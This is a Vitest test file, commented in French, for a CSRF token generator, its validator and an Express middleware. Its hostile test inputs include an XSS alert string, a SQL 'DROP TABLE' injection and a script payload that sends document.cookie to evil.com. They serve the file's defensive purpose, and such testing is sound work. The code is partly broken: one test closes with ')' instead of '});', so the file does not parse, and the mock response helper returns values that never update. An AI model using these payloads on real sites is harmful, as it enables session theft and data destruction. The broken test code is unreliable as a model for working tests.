import { describe, it, expect, beforeEach, vi } from 'vitest';
import { generateCsrfToken, validateCsrfToken, csrfMiddleware } from './csrf.js';
import type { Request, Response, NextFunction } from 'express';

// ═══════════════════════════════════════════════════════════════════════════
// generateCsrfToken + validateCsrfToken — tests unitaires
// ═══════════════════════════════════════════════════════════════════════════

describe('generateCsrfToken', () => {
  it('retourne un objet avec token (string) et expiresAt (number)', () => {
    const { token, expiresAt } = generateCsrfToken();
    expect(typeof token).toBe('string');
    expect(typeof expiresAt).toBe('number');
  });

  it('le token contient exactement deux segments séparés par un point', () => {
    const { token } = generateCsrfToken();
    const parts = token.split('.');
    expect(parts).toHaveLength(2);
  });

  it('expiresAt est dans le futur (env. 15 minutes)', () => {
    const now = Math.floor(Date.now() / 1000);
    const { expiresAt } = generateCsrfToken();
    expect(expiresAt).toBeGreaterThan(now + 14 * 60);
    expect(expiresAt).toBeLessThanOrEqual(now + 15 * 60 + 5);
  });

  it('génère des tokens différents à chaque appel (jti unique)', () => {
    const { token: t1 } = generateCsrfToken();
    const { token: t2 } = generateCsrfToken();
    expect(t1).not.toBe(t2);
  });

  it('le segment payload est du base64url valide et décode un JSON avec jti/iat/exp', () => {
    const { token } = generateCsrfToken();
    const [payloadB64] = token.split('.');
    const json = Buffer.from(
      payloadB64.replace(/-/g, '+').replace(/_/g, '/'),
      'base64'
    ).toString('utf8');
    const payload = JSON.parse(json);
    expect(typeof payload.jti).toBe('string');
    expect(payload.jti.length).toBeGreaterThan(0);
    expect(typeof payload.iat).toBe('number');
    expect(typeof payload.exp).toBe('number');
    expect(payload.exp).toBeGreaterThan(payload.iat);
  });
});

describe('validateCsrfToken', () => {
  it('valide un token fraîchement généré', () => {
    const { token } = generateCsrfToken();
    expect(validateCsrfToken(token)).toBe(true);
  });

  it('rejette une chaîne vide', () => {
    expect(validateCsrfToken('')).toBe(false);
  });

  it('rejette un token avec un seul segment (pas de point)', () => {
    expect(validateCsrfToken('onlyone')).toBe(false);
  });

  it('rejette un token avec trois segments', () => {
    expect(validateCsrfToken('a.b.c')).toBe(false);
  });

  it('rejette un token dont le payload est du base64 invalide', () => {
    expect(validateCsrfToken('!!!invalid!!!.abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890')).toBe(false);
  });

  it('rejette un token dont le payload JSON est malformé', () => {
    const badPayload = Buffer.from('{not-json}').toString('base64url');
    expect(validateCsrfToken(`${badPayload}.abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890`)).toBe(false);
  });

  it('rejette un token dont le payload manque le champ jti', () => {
    const payload = Buffer.from(JSON.stringify({ iat: 1000, exp: 9999999999 })).toString('base64url');
    expect(validateCsrfToken(`${payload}.abcdef1234`)).toBe(false);
  });

  it('rejette un token expiré', () => {
    const now = Math.floor(Date.now() / 1000);
    // exp dans le passé
    const payload = { jti: 'test-jti', iat: now - 1000, exp: now - 1 };
    const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');
    // La signature est incorrecte mais l'expiration est vérifiée en premier
    expect(validateCsrfToken(`${payloadB64}.invalidsignature`)).toBe(false);
  });

  it('rejette un token avec iat dans le futur (> now + 5s)', () => {
    const now = Math.floor(Date.now() / 1000);
    const payload = { jti: 'test-jti', iat: now + 100, exp: now + 1000 };
    const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');
    expect(validateCsrfToken(`${payloadB64}.invalidsignature`)).toBe(false);
  });

  it('rejette un token avec une signature altérée (bit flip)', () => {
    const { token } = generateCsrfToken();
    const [payload, sig] = token.split('.');
    // Inverse le premier caractère de la signature
    const flipped = sig.charAt(0) === 'a' ? 'b' + sig.slice(1) : 'a' + sig.slice(1);
    expect(validateCsrfToken(`${payload}.${flipped}`)).toBe(false);
  });

  it('rejette un token dont la signature a une longueur différente', () => {
    const { token } = generateCsrfToken();
    const [payload] = token.split('.');
    expect(validateCsrfToken(`${payload}.tooshort`)).toBe(false);
  });

  it('rejette null (type incorrect)', () => {
    // @ts-expect-error — test intentionnel avec mauvais type
    expect(validateCsrfToken(null)).toBe(false);
  });

  it('rejette un nombre (type incorrect)', () => {
    // @ts-expect-error — test intentionnel avec mauvais type
    expect(validateCsrfToken(12345)).toBe(false);
  );

  it('résiste à une injection XSS dans le token', () => {
    expect(validateCsrfToken('<script>alert(1)</script>.evilsig')).toBe(false);
  });

  it('résiste à une injection SQL dans le token', () => {
    expect(validateCsrfToken("'; DROP TABLE csrf_tokens; --.evilsig")).toBe(false);
  });

  it('deux tokens différents sont tous deux valides (multi-onglets)', () => {
    const { token: t1 } = generateCsrfToken();
    const { token: t2 } = generateCsrfToken();
    expect(validateCsrfToken(t1)).toBe(true);
    expect(validateCsrfToken(t2)).toBe(true);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// csrfMiddleware — tests d'intégration Express
// ═══════════════════════════════════════════════════════════════════════════

describe('csrfMiddleware', () => {
  function buildMockReq(
    method: string,
    headers: Record<string, string> = {}
  ): Partial<Request> {
    return { method, headers } as Partial<Request>;
  }

  function buildMockRes(): { res: Partial<Response>; statusCode: number | null; body: unknown } {
    const ctx = { statusCode: null as number | null, body: null as unknown };
    const res: Partial<Response> = {
      status: vi.fn().mockImplementation((code: number) => {
        ctx.statusCode = code;
        return res;
      }),
      json: vi.fn().mockImplementation((data: unknown) => {
        ctx.body = data;
        return res;
      }),
    };
    return { res, statusCode: ctx.statusCode, body: ctx.body };
  }

  it('laisse passer une requête GET sans token', () => {
    const req = buildMockReq('GET');
    const { res } = buildMockRes();
    const next = vi.fn();

    csrfMiddleware(req as Request, res as Response, next as NextFunction);

    expect(next).toHaveBeenCalledOnce();
    expect(res.status).not.toHaveBeenCalled();
  });

  it('laisse passer une requête HEAD sans token', () => {
    const req = buildMockReq('HEAD');
    const { res } = buildMockRes();
    const next = vi.fn();

    csrfMiddleware(req as Request, res as Response, next as NextFunction);

    expect(next).toHaveBeenCalledOnce();
  });

  it('laisse passer une requête OPTIONS sans token', () => {
    const req = buildMockReq('OPTIONS');
    const { res } = buildMockRes();
    const next = vi.fn();

    csrfMiddleware(req as Request, res as Response, next as NextFunction);

    expect(next).toHaveBeenCalledOnce();
  });

  it('bloque un POST sans header X-CSRF-Token avec 403', () => {
    const req = buildMockReq('POST');
    const { res } = buildMockRes();
    const next = vi.fn();

    csrfMiddleware(req as Request, res as Response, next as NextFunction);

    expect(next).not.toHaveBeenCalled();
    expect(res.status).toHaveBeenCalledWith(403);
  });

  it('bloque un POST avec un token invalide avec 403', () => {
    const req = buildMockReq('POST', { 'x-csrf-token': 'invalid.token' });
    const { res } = buildMockRes();
    const next = vi.fn();

    csrfMiddleware(req as Request, res as Response, next as NextFunction);

    expect(next).not.toHaveBeenCalled();
    expect(res.status).toHaveBeenCalledWith(403);
  });

  it('bloque un DELETE avec un token invalide avec 403', () => {
    const req = buildMockReq('DELETE', { 'x-csrf-token': 'garbage' });
    const { res } = buildMockRes();
    const next = vi.fn();

    csrfMiddleware(req as Request, res as Response, next as NextFunction);

    expect(next).not.toHaveBeenCalled();
    expect(res.status).toHaveBeenCalledWith(403);
  });

  it('laisse passer un POST avec un token valide', () => {
    const { token } = generateCsrfToken();
    const req = buildMockReq('POST', { 'x-csrf-token': token });
    const { res } = buildMockRes();
    const next = vi.fn();

    csrfMiddleware(req as Request, res as Response, next as NextFunction);

    expect(next).toHaveBeenCalledOnce();
    expect(res.status).not.toHaveBeenCalled();
  });

  it('laisse passer un DELETE avec un token valide', () => {
    const { token } = generateCsrfToken();
    const req = buildMockReq('DELETE', { 'x-csrf-token': token });
    const { res } = buildMockRes();
    const next = vi.fn();

    csrfMiddleware(req as Request, res as Response, next as NextFunction);

    expect(next).toHaveBeenCalledOnce();
  });

  it('retourne le code erreur CSRF_INVALID dans le body JSON', () => {
    const req = buildMockReq('POST');
    const { res } = buildMockRes();
    const next = vi.fn();

    csrfMiddleware(req as Request, res as Response, next as NextFunction);

    expect(res.json).toHaveBeenCalledWith(
      expect.objectContaining({ code: 'CSRF_INVALID' })
    );
  });

  it('gère un header x-csrf-token fourni comme tableau (prend le premier)', () => {
    const { token } = generateCsrfToken();
    // Express peut exposer des headers multivalués comme tableau
    const req = { method: 'POST', headers: { 'x-csrf-token': [token, 'other'] } } as unknown as Request;
    const { res } = buildMockRes();
    const next = vi.fn();

    csrfMiddleware(req as Request, res as Response, next as NextFunction);

    expect(next).toHaveBeenCalledOnce();
  });

  it('résiste à une injection XSS dans le header CSRF', () => {
    const req = buildMockReq('POST', {
      'x-csrf-token': '<script>fetch("https://evil.com?c="+document.cookie)</script>',
    });
    const { res } = buildMockRes();
    const next = vi.fn();

    csrfMiddleware(req as Request, res as Response, next as NextFunction);

    expect(next).not.toHaveBeenCalled();
    expect(res.status).toHaveBeenCalledWith(403);
  });
});